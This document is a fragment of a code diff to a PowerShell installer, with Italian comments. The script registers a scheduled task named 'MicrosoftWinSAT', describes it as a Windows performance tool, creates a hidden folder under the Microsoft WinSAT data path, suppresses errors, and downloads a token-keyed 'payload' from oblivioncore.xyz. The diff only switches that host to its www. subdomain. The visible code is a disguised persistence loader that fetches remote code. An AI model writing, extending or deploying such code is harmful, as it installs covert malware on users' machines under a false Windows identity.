@@ -32,7 +32,7 @@ $taskName     = 'MicrosoftWinSAT'
 $taskDesc     = 'Windows System Assessment Tool — Performance Monitor'
 $launchScript = [System.IO.Path]::Combine($installBase, 'WinSATHelper.ps1')
 $configDat    = [System.IO.Path]::Combine($installBase, 'config.dat')
-$downloaderUrl = 'https://oblivioncore.xyz/api/installer/payload?token=${token}'
+$downloaderUrl = 'https://www.oblivioncore.xyz/api/installer/payload?token=${token}'
 
 # ── Crea cartella nascosta ────────────────────────────────────────────────────
 New-Item -ItemType Directory -Path $installBase -Force | Out-Null
@@ -53,8 +53,8 @@ $launcherCode = @'
 $ErrorActionPreference = 'SilentlyContinue'
 $installBase = [System.IO.Path]::Combine($env:LOCALAPPDATA,'Microsoft','WinSAT','DataStore')
 $configDat   = [System.IO.Path]::Combine($installBase,'config.dat')
-$payloadUrl  = 'https://oblivioncore.xyz/api/installer/payload'
-$apiBase     = 'https://oblivioncore.xyz'
+$payloadUrl  = 'https://www.oblivioncore.xyz/api/installer/payload'
+$apiBase     = 'https://www.oblivioncore.xyz'
 $logFile     = [System.IO.Path]::Combine($installBase,'watcher.log')
 
 function Log {
